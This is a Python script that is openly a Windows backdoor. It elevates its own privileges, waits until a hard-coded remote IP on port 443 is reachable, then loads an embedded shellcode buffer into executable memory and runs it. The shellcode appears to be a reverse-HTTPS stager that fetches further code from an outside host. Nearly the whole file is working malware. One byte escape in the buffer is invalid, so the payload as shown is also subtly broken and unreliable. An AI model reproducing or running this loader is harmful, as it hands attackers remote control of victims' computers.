from subprocess import Popen, SW_HIDE, STARTUPINFO, STARTF_USESHOWWINDOW
from elevate import elevate
from multiprocessing import Process
from requests import get
from winreg import *
from shutil import copyfile
from time import sleep
import socket
import ctypes
import base64
import sys
import os

def ShellCode_backdoor_in_base64():
	try:
		buf =  b""
		buf += b"\xfc\x43\x13\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51"
		buf += b"\x41\x50\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52"
		buf += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x4d\x31\xc9"
		buf += b"\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x48\x31\xc0"
		buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		buf += b"\x01\xc1\xe8\xed\x52\x48\x8b\x52\x20\x41\x51\x8b"
		buf += b"\x42\x6c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
		buf += b"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48"
		buf += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
		buf += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48"
		buf += b"\xff\xc4\x41\x8b\x74\x28\x48\x01\xd6\x48\x31\xc0"
		buf += b"\x41\xc1\xc9\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1"
		buf += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
		buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
		buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58"
		buf += b"\x48\x01\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		buf += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
		buf += b"\x59\x5a\x48\x8b\x19\xe3\x4b\xff\xff\xff\x5d\x48"
		buf += b"\x31\xdb\x53\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74"
		buf += b"\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c\x77\x26"
		buf += b"\x07\xff\xd5\x53\x53\x48\x89\xe1\x53\x5a\x4d\x31"
		buf += b"\xc0\x4d\x31\xc9\x53\x53\x49\xba\x3a\x56\x79\xa7"
		buf += b"\x00\x00\x00\x00\xff\xd5\xe8\x0e\x00\x00\x00\x31"
		buf += b"\x38\x35\x2e\x36\x35\x2e\x32\x30\x30\x2e\x39\x36"
		buf += b"\x00\x5a\x48\x89\xc1\x49\xc7\xc0\xbb\x01\x00\x00"
		buf += b"\x4d\x31\xc9\x53\x53\x6a\x03\x53\x49\xba\x57\x89"
		buf += b"\x9f\xc6\x00\x00\x00\x00\xff\xd5\xe8\xef\x00\x00"
		buf += b"\x00\x2f\x37\x33\x56\x63\x6e\x43\x59\x49\x5a\x46"
		buf += b"\x43\x6c\x47\x4b\x51\x61\x77\x6e\x34\x41\x54\x67"
		buf += b"\x4e\x2d\x6c\x68\x62\x38\x50\x66\x47\x5f\x55\x36"
		buf += b"\x38\x47\x41\x59\x58\x46\x34\x33\x61\x6d\x4a\x52"
		buf += b"\x6f\x52\x75\x39\x41\x51\x63\x4a\x74\x4f\x72\x68"
		buf += b"\x2d\x75\x45\x52\x6f\x57\x4f\x71\x76\x55\x4b\x67"
		buf += b"\xc0\x53\x5a\x48\x89\xf1\x4d\x31\xc9\x4d\x31\xc9"
		buf += b"\x53\x53\x49\xc7\xc2\x2d\x06\x18\x7b\xff\xd5\x85"
		buf += b"\xc0\x75\x1f\x48\xc7\xc1\x88\x13\x00\x00\x49\xba"
		buf += b"\x44\xf0\x35\xe0\x00\x00\x00\x00\xff\xd5\x48\xff"
		buf += b"\xcf\x74\x02\xeb\xaa\xe8\x55\x00\x00\x00\x53\x59"
		buf += b"\x6a\x40\x5a\x49\x89\xd1\xc1\xe2\x10\x49\xc7\xc0"
		buf += b"\x00\x10\x00\x00\x49\xba\x58\xa4\x53\xe5\x00\x00"
		buf += b"\x00\x00\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48"
		buf += b"\x89\xf1\x48\x89\xda\x49\xc7\xc0\x00\x20\x00\x00"
		buf += b"\x47\x89\xx9\x49\xba\x12\x96\x89\xe2\x00\x00\x00"
		buf += b"\x00\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb2\x66"
		buf += b"\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd2\x58\xc3\x58"
		buf += b"\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5"

		cbuf = (ctypes.c_char * len(buf)).from_buffer_copy(buf)

		ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p

		ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_long(0),ctypes.c_long(len(buf)*2),ctypes.c_int(0x3000),ctypes.c_int(0x40))

		ctypes.windll.kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p,ctypes.c_void_p,ctypes.c_int]

		ctypes.windll.kernel32.RtlMoveMemory(ptr,cbuf,ctypes.c_int(len(buf)*2))

		ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()

		input()
		sleep(2)

	except Exception as r:
		print(r)

def check_connection(server_ip, server_port):
	while True:
		sock = None

		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			res_ = sock.connect_ex(( server_ip, server_port ))

			if res_ == 0:
				#print("EXCELLENT", res_)

				sleep(3)

				sock.close()
				sock = None

				sleep(5)

				ShellCode_backdoor_in_base64()

				return False
			else:
				#print("NO connection")

				sleep(3)

				sock.close()
				sock = None

				sleep(5)

		except Exception as warning_:

			try:
				sock.close()
				sock = None
			except Exception as ClosedSocked_:
				#print(ClosedSocked_)
				sleep(5)

			#print(warning_)
			sleep(5)



def main():
	try:
		elevate()

		process1 = Process( target = check_connection, args=("185.65.195.121", 443) )
		#process2 = Process( target = emergency_restart )

		process1.start()
		#process2.start()

		process1.join()
		#process2.join()

	except Exception as mainError_:
		
		sleep(15)
		main()

if __name__ == '__main__':
	main()
